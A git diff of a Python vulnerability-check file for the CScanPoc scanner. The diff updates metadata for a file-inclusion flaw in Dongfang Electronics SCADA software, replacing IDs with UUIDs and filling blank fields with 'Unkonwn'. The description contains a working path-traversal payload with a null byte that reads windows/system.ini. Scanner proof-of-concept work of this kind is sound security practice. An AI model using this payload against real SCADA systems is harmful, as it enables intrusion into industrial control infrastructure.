@@ -5,7 +5,7 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = 'DFE_SCADA_0006' # 平台漏洞编号，留空
+    poc_id = '402e65bf-4c74-4905-b7a3-41e5ad644231'
     name = '东方电子SCADA通用系统文件包含' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.LFI # 漏洞类型
@@ -14,15 +14,15 @@ class Vuln(ABVuln):
         东方电子SCADA通用系统文件包含：
         /modules/tmr/server/switchControlPanel.php?func=../../../../../../../../../../../../windows/system.ini%00.htm
     ''' # 漏洞描述
-    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131719
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
+    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131719
+    cnvd_id = 'Unkonwn' # cnvd漏洞编号
+    cve_id = 'Unkonwn' #cve编号
     product = '东方电子SCADA'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = 'dfe_scada_0006' # 平台 POC 编号，留空
+    poc_id = '76b655aa-bfce-484e-bc49-9ab350e6013a'
     author = '国光'  # POC编写者
     create_date = '2018-05-25' # POC创建时间
 
